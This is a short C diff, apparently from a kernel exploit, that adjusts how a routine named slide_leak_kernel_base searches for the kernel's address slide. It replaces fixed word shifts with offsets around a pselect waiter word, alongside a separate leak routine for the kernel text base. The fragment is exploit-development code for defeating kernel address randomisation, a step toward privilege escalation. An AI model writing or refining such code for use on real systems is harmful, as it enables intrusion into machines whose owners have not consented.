@@ -3,7 +3,7 @@
 #define SLIDE_MAX_ATTEMPTS 40
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
-#define SLIDE_PSELECT_WORD_SHIFT_BASE 0
+#define SLIDE_PSELECT_WORD_SHIFT_BASE PSELECT_WAITER_WORD_SHIFT
 #define SLIDE_WAIT_SECONDS 10
 
 static uint32_t slide_f_wait;
@@ -403,7 +403,12 @@ uint64_t slide_child_leak_stext(void) {
 }
 
 int slide_leak_kernel_base(void) {
-  int shifts[] = {0, 1, 2, 3, -1, -2};
+  int shifts[] = {PSELECT_WAITER_WORD_SHIFT,
+                  PSELECT_WAITER_WORD_SHIFT + 1,
+                  PSELECT_WAITER_WORD_SHIFT + 2,
+                  PSELECT_WAITER_WORD_SHIFT - 1,
+                  PSELECT_WAITER_WORD_SHIFT - 2,
+                  PSELECT_WAITER_WORD_SHIFT - 3};
   int n_shifts = sizeof(shifts) / sizeof(shifts[0]);
 
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
